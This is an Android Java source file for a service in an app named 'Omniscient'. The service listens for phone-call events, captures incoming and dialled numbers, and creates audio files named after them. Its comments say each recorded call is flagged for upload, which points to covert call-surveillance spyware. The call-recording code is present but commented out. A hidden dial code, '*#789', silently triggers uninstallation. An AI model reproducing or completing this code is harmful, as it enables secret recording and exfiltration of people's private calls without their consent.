package com.postal.omniscient.postal.catchPhone.Call;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;
import com.postal.omniscient.postal.downloadFiles.KeepConnection;

import org.greenrobot.eventbus.EventBus;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class PhoneCallService extends Service {
    public PhoneCallService() {
    }
    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
    private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
    private CallStateReceiver callState;
    private MediaRecorder recorder;
    private File audiofile;
    private boolean recordstarted = false;
    public boolean wasRinging = false;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_OUT);
        filter.addAction(ACTION_IN);
        this.callState = new CallStateReceiver();
        this.registerReceiver(this.callState, filter);

        return START_STICKY;//_REDELIVER_INTENT;
    }

    public class CallStateReceiver extends BroadcastReceiver {
        public CallStateReceiver() {
        }

        Bundle bundle;
        String state;
        String inCall, outCall;


        private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
        private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
        private static final String code = "*#789";

        @Override
        public void onReceive(Context context, Intent intent) {

//            Log.i("MyMsg", "1");
//            if (intent.getAction().equals(ACTION_IN)) {
//                Log.i("MyMsg", "2");
//                if ((bundle = intent.getExtras()) != null) {
//                    state = bundle.getString(TelephonyManager.EXTRA_STATE);
//                    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
//                        inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
//                    } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
//                        Boolean start_or_no = new ThreadIsAliveOrNot("InCallWrite").liveORnot();
//                        if (!start_or_no && inCall != null) {
//                            sendEvent("call_in", "TreadConnect");
//                            //EventBus.getDefault().post(new EventBusData("call_in"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
//                            new Thread(new CallInThread(context, inCall, "In_call", "_in_call.amr"),
//                                    "InCallWrite").start();
//                            Log.i("MyMsg", "ACTION_IN start");
//                        }
//                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
//                        Log.i("MyMsg", "3");
//                        EventBus.getDefault().post(new EventBusCall("stop"));
//                    }
//                }
//            } else if (intent.getAction().equals(ACTION_OUT)) {
//                Log.i("MyMsg", "4");
//                if ((bundle = intent.getExtras()) != null) {
//                    outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//                    if (outCall.equals(code)) {
//                        Log.i("MyMsg", "start DELETE APP");
//                        deleteAPP(context);
//
//                    }
//                    //проверка на набор сервисов (*111#) а то срабатывает событие вызова
//                    if (!outCall.contains("*") || !outCall.contains("#")) {
//                        outCall = outCall.replace("+", "");
//                        Boolean start_or_no = new ThreadIsAliveOrNot("OutCallWrite").liveORnot();
//                        if (!start_or_no && outCall != null) {
//                            sendEvent("call_out", "TreadConnect");
//                            //EventBus.getDefault().post(new EventBusData("call_out"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
//                            new Thread(new CallInThread(context, outCall, "Out_call", "_out_call.amr"),
//                                    "OutCallWrite").start();
//                            Log.i("MyMsg", "ACTION_OUT start");
//                        }
//                    }
//                }
//            }
            if (intent.getAction().equals(ACTION_IN)) {
                if ((bundle = intent.getExtras()) != null) {
                    state = bundle.getString(TelephonyManager.EXTRA_STATE);
                    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                        wasRinging = true;
//
                    } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        if (wasRinging == true) {
//                            EventBus.getDefault().post(new EventBusData("call_in"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
//
//                            String time = new SimpleDateFormat("dd_MM_yyyy_HH-mm")
//                                    .format(new Date());
//                            File sampleDir = new File(context.getFilesDir(), "/Omniscient/In_call");
//
//                            if (!sampleDir.exists()) {
//                                sampleDir.mkdirs();
//                            }
//                            String file_name = inCall+"_"+time;
//                            try {
//                                audiofile = File.createTempFile(file_name, "_in_call.amr", sampleDir);
//                            } catch (IOException e) {
//                                Log.i("MyMsg", "Eror T -1 "+e);
//                            }
//
//                            recorder = new MediaRecorder();
////                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
//                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
//                            recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
//                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
//                            recorder.setOutputFile(audiofile.getAbsolutePath());
//                            try {
//                                recorder.prepare();
//                            } catch (IllegalStateException e) {
//                                Log.i("MyMsg", "Eror T0 "+e);
//                            } catch (IOException e) {
//                                Log.i("MyMsg", "Eror T1 "+e);
//                            }
//                            recorder.start();
                            recordstarted = true;
                        }
                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        wasRinging = false;
//
                        Log.i("MyMsg", "1 call off");
//                        if (recordstarted) {
//                            recorder.stop();
//                            recordstarted = false;
//                        }
                        EventBus.getDefault().post(new EventBusData("call_off"));
                    }
                }
            } else if (intent.getAction().equals(ACTION_OUT)) {
                if ((bundle = intent.getExtras()) != null) {
                    outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                    if (outCall.equals(code)) {
                        Log.i("MyMsg", "start DELETE APP");
                        deleteAPP(context);
                    }
                    //проверка на набор сервисов (*111#) а то срабатывает событие вызова
                    if (!outCall.contains("*") || !outCall.contains("#")){
                        outCall = outCall.replace("+", "");

                        EventBus.getDefault().post(new EventBusData("call_out"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
                        Log.i("MyMsg", "Name on ACTION_OUT "+outCall);

                        //сохраняем на телефон
                        String time = new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
                                .format(new Date());
                        File sampleDir = new File(context.getFilesDir(), "/Omniscient/Out_call");

                        if (!sampleDir.exists()) {
                            sampleDir.mkdirs();
                        }

                        String file_name = outCall+"_"+time;
                        try {
                            audiofile = File.createTempFile(file_name, "_out_call.amr", sampleDir);

                        } catch (IOException e) {
                            Log.i("MyMsg", "Eror T3 "+e);
                        }
                        //String path = Environment.getExternalStorageDirectory().getAbsolutePath();

//                        recorder = new MediaRecorder();
//
//                        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
//                        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
//                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
//                        recorder.setOutputFile(audiofile.getAbsolutePath());
//                        try {
//                            recorder.prepare();
//                        } catch (IllegalStateException e) {
//                            Log.i("MyMsg", "Eror T4 "+e);
//                        } catch (IOException e) {
//                            Log.i("MyMsg", "Eror T5 "+e);
//                        }
//
//                        recorder.start();
                        recordstarted = true;
                    }
                } } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {

//                        Toast.makeText(context, "REJECT || DISCO", Toast.LENGTH_LONG).show();
                Log.i("MyMsg", "2call off");
//                if (recordstarted) {
//                    recorder.stop();
//                    recordstarted = false;
//                }
                EventBus.getDefault().post(new EventBusData("call_off"));//разгоаор записан говорим "загрузи файл"
            }

        }

        private void deleteAPP(final Context context) {
            Uri packageURI = Uri.parse("package:com.postal.omniscient");
            Intent i = new Intent(Intent.ACTION_DELETE, packageURI);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }

        //ошибка может произойти когда шлем увидомление  а поток TreadConnect не работает
        private void sendEvent(String call, String threadName) {
            Boolean start_or_no = new ThreadIsAliveOrNot(threadName).liveORnot();
            if (start_or_no) {
                EventBus.getDefault().post(new EventBusData(call));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
                new Thread().run();
                Thread tr = new Thread();
                tr.run();
            }
        }
    }
}
